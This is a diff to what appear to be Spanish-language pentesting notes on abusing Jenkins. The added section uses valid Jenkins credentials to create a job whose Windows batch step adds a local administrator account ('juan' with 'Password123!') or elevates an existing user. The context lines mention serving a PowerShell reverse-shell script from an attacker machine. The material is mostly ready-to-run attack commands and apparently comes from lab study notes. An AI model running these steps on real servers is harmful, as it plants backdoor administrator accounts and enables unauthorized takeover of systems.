@@ -63,3 +63,23 @@ Notas:
 	1. Para compartir el script de 'Invoke-PowerShelTcp.ps1' se puede ejecutar en la máquina de atacante Windows el programa de 'hfs.exe' que permite compartir archivos 
 	2. Dar click en 'Build now' cuando ya se tenga el comando de escucha y el script compartido con 'hfs'
 ```
+
+## Forma 3 - Jenkins admin user 
+```bash 
+1. Se debe tener credenciales validas para acceder al 'login' 
+
+2. 'Create a job > Colocar Nombre > Environment > Build Steps'
+
+3. En 'Execute Windows batch Command'
+	❯ net localgroup administrators omar /add 
+
+NOTA:
+	- Se necesita salir y volver a iniciar sessión para aplicar los cambios 
+
+# Opción 2 (Es un comando por ejecución) (Opcional)
+	❯ net user juan Password123! /add 
+	❯ net localgroup administrators juan /add 
+
+4. Dar click en 'Apply > Save' y finalizar con 'Build now' para ejecutar el comando anterior 
+```
+
